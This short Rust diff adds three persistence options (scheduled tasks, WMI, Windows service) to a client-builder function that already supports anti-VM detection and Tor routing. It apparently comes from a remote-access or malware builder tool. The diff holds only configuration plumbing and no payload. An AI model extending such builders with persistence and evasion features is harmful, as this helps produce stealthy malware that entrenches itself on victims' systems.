@@ -214,6 +214,9 @@ pub async fn build_client(
     anti_vm_detection: bool,
     use_tor: bool,
     tor_address: &str,
+    persistence_schtasks: bool,
+    persistence_wmi: bool,
+    persistence_service: bool,
     app_handle: AppHandle,
 ) -> Result<String, String> {
     let log = Log {
@@ -238,6 +241,9 @@ pub async fn build_client(
         anti_vm_detection,
         use_tor,
         tor_address: tor_address.to_string(),
+        persistence_schtasks,
+        persistence_wmi,
+        persistence_service,
     };
 
     apply_config(&config).await?;
